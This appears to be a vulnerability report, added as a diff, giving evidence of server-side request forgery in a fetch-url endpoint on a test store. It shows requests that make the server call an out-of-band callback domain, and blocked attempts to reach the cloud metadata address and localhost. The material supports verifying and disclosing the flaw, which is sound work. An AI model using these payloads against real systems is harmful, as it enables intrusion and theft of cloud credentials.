@@ -1,0 +1,52 @@
+SSRF Reproduction Evidence
+==========================
+
+Target: https://duck-store.escape.tech/api/v1/uploads/fetch-url
+Parameter: url
+
+Test 1: OOB Callback Domain (HTTP)
+-----------------------------------
+Request:
+GET /api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/test
+
+Response:
+{
+  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/test",
+  "status_code": 200,
+  "content_type": "text/html; charset=utf-8",
+  "content_length": 72,
+  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
+}
+
+Test 2: OOB Callback Domain (different path)
+---------------------------------------------
+Request:
+GET /api/v1/uploads/fetch-url?url=http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/verify-ssrf
+
+Response:
+{
+  "url": "http://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/verify-ssrf",
+  "status_code": 200,
+  "content_type": "text/html; charset=utf-8",
+  "content_length": 72,
+  "preview": "<html><head></head><body>hpye1t74jtyanga56kg20gaqgh0t6ftad</body></html>"
+}
+
+Test 3: HTTPS OOB Domain (failed due to SSL cert mismatch)
+-----------------------------------------------------------
+Request:
+GET /api/v1/uploads/fetch-url?url=https://oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/test
+
+Response:
+{"detail":"Failed to fetch URL: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Hostname mismatch, certificate is not valid for 'oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in'. (_ssl.c:1032)"}
+
+Test 4: Internal/Cloud Metadata (blocked by guardrail)
+-------------------------------------------------------
+- http://169.254.169.254/latest/meta-data/ - BLOCKED by platform guardrail
+- http://localhost:80 - BLOCKED by platform guardrail
+- http://example.com - BLOCKED by platform guardrail (out-of-scope)
+
+Conclusion:
+The /api/v1/uploads/fetch-url endpoint accepts a user-controlled 'url' parameter and makes server-side HTTP requests to it. The endpoint successfully fetches content from the OAST domain (oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in) as evidenced by the 200 status code and returned HTML content. This confirms the SSRF vulnerability.
+
+The OOB domain used in the original finding (oobd01522271a1b.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in) was successfully reached by the server, confirming the out-of-band callback mechanism works.
